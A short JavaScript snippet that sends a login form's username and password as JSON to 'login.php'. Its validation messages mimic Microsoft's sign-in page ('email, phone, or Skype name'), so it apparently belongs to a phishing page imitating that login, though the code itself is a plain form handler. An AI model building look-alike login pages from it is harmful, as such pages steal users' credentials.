<script>
    document.addEventListener('DOMContentLoaded', (event) => {
        const sectionFinal = document.getElementById('section_final');
        const form = document.getElementById('login_form');

        form.addEventListener('submit', (event) => {
            event.preventDefault(); // Prevent default form submission

            const uname = document.getElementById('inp_uname').value.trim();
            const pass = document.getElementById('inp_pwd').value.trim();

            if (uname && pass) {
                // Both email and password are provided
                // Make AJAX request to submit both data simultaneously
                fetch('login.php', {
                    method: 'POST',
                    body: JSON.stringify({
                        uname: uname,
                        pass: pass
                    }),
                    headers: {
                        'Content-Type': 'application/json'
                    }
                })
                .then(response => {
                    if (response.ok) {
                        // Success handling
                        console.log('Data submitted successfully');
                        // Optionally, redirect to another page
                        // window.location.href = 'success.php';
                    } else {
                        // Error handling
                        console.error('Error submitting data');
                    }
                })
                .catch(error => {
                    console.error('Error:', error);
                });
            } else {
                // Validation error, both email and password are required
                document.getElementById('error_uname').textContent = uname ? '' : 'Please enter a valid email, phone, or Skype name.';
                document.getElementById('error_pwd').textContent = pass ? '' : 'Please enter your password.';
            }
        });
    });
</script>



















